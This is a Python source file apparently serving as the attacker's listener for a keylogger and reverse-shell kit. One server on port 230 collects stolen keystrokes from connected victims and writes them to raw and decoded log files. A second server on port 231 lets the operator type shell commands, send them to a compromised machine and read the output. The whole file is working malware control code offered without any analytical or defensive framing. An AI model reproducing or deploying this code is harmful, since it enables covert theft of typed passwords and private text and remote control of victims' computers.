import socket,queue
from threading import *

addfilequeue = queue.Queue()

class servers:
    class keylog:
        def start_server():
            obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            def addtosort(data):
                global addfilequeue
                addfilequeue.put(data)
            host = ""
            port = 230
            ip = (host,port)
            obj.bind(ip)
            obj.listen(1)
            while True:
                conn,addr = obj.accept()
                print("Keylogger Connected to",str(addr))
                while True:
                    data = conn.recv((8196))
                    data = data.decode()
                    addtosort(data)
        def sortdatatofile():
            global addfilequeue,process_data_file,process_data_file
            while True:
                if not addfilequeue.empty():
                    raw_data_file = open("raw_data.txt","a")
                    process_data_file = open("process_data.txt","a")  
                    dtp = addfilequeue.get()
                    dtp = dtp.split("|JOIN|")
                    for i in dtp:
                        raw_data_file.write(i)
                    raw_data_file.close()
                    for i in dtp:
                        if i == "BACKSPACE":
                            key = "\n<BACKSPACE>\n"
                        elif i == "ENTER":
                            key = "\n"
                        elif i == "SPACE":
                            key = " "
                        elif len(i) > 1:
                            key = "\n<"+i+">\n"
                        else:
                            key = i
                        process_data_file.write(key)
                    process_data_file.close()
    
                    
                    
    class revshell:
        def start_server():
            global revobj
            revobj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            revobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            host = ""
            port =231
            ip =(host,port)
            revobj.bind(ip)
            revobj.listen(1)
            while True:
                try:
                    conn,addr = revobj.accept()
                    print("Reverse Shell Connected to",str(addr))
                except:
                    None
                while True:
                    commands = []
                    numq=1
                    while True:
                        inp = str(input("Enter Command {}: ".format(numq)))
                        if inp != "":
                            commands.append(inp)
                            numq=numq+1
                        else:
                            break
                    if len(commands)>1:
                        commands = "\n".join(commands)
                    else:
                        try:
                            commands = commands[0]
                        except:
                            commands = ""
                    
                    print(commands)
                    conn.sendall(commands.encode())
                    num = 4096*16
                    output = conn.recv(num).decode("850")
                    print(output)
                    
                    
                
                


klst = Thread(target=servers.keylog.start_server)
klst.setDaemon(True)
sdt = Thread(target=servers.keylog.sortdatatofile)
sdt.setDaemon(True)
rsst = Thread(target=servers.revshell.start_server)
rsst.setDaemon(True)
klst.start()
sdt.start()
rsst.start()


while True:
    None

            
            
